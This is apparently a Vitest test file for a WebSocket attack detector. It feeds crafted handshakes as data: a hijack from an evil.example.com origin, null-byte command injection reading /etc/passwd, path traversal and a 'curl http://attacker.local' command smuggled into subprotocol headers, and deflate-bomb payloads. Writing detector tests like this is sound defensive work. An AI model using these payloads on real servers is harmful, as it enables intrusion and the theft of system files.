import { describe, expect, it } from 'vitest'
import { detectWebSocketAttack } from './websocket-evaluator.js'

describe('websocket-evaluator advanced detection', () => {
    it('detects cross-site websocket hijack with origin mismatch and missing csrf token', () => {
        const input = `
GET /ws HTTP/1.1
Host: app.example.com
Origin: https://evil.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('Cross-site websocket hijack'))).toBe(true)
    })

    it('detects cross-site websocket hijack with predictable websocket key', () => {
        const input = `
GET /ws HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: AAAAAAAAAAAAAAAAAAAAAA==
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('Cross-site websocket hijack'))).toBe(true)
    })

    it('detects binary-frame injection through opcode 0x02 payload with null-byte filtering', () => {
        const input = `
GET /ws HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
Opcode: 0x02
Payload: cat%00/etc/passwd%00;id
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('Binary websocket frame injection'))).toBe(true)
    })

    it('detects fragmented binary frame injection via continuation reassembly', () => {
        const input = `
GET /ws HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
Opcode: 0x02
Fin: 0
Payload: se%00lect
Opcode: 0x00
Payload: * from users where id=1
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('Binary websocket frame injection'))).toBe(true)
    })

    it('detects subprotocol abuse for soap protocol traversal payload', () => {
        const input = `
GET /ws HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
Sec-WebSocket-Protocol: soap, ../../etc/passwd
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('WebSocket subprotocol abuse'))).toBe(true)
    })

    it('detects subprotocol abuse for mqtt command payload', () => {
        const input = `
GET /ws HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
Sec-WebSocket-Protocol: mqtt;curl http://attacker.local
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('WebSocket subprotocol abuse'))).toBe(true)
    })

    it('detects websocket extension abuse with permessage-deflate and crafted compressed payload', () => {
        const input = `
GET /ws HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=15; client_no_context_takeover
Payload: H4sIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('WebSocket extension abuse'))).toBe(true)
    })

    it('detects websocket extension abuse with explicit deflate bombs markers', () => {
        const input = `
GET /ws HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=15; server_no_context_takeover
Payload: 0x78 0x9c ff ff 00 00
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('WebSocket extension abuse'))).toBe(true)
    })

    it('detects websocket auth bypass on admin endpoint without cookies', () => {
        const input = `
GET /ws/admin HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
Authorization: Bearer deadbeef
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('WebSocket auth bypass attempt'))).toBe(true)
    })

    it('detects websocket auth bypass on internal endpoint with downgraded session token', () => {
        const input = `
GET /ws/internal HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
Cookie: session=guest; theme=dark
Authorization: Bearer deadbeef
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('WebSocket auth bypass attempt'))).toBe(true)
    })

    it('detects websocket subprotocol abuse through protocol command separator', () => {
        const input = `
GET /ws HTTP/1.1
Host: app.example.com
Origin: https://app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGVzdGVyMTIzNDU2Nzg5MDEyMw==
Sec-WebSocket-Protocol: mqtt,../..//etc/passwd
`
        const detections = detectWebSocketAttack(input)
        expect(detections.some((d) => d.type === 'ws_hijack' && d.detail.includes('WebSocket subprotocol abuse'))).toBe(true)
    })
})
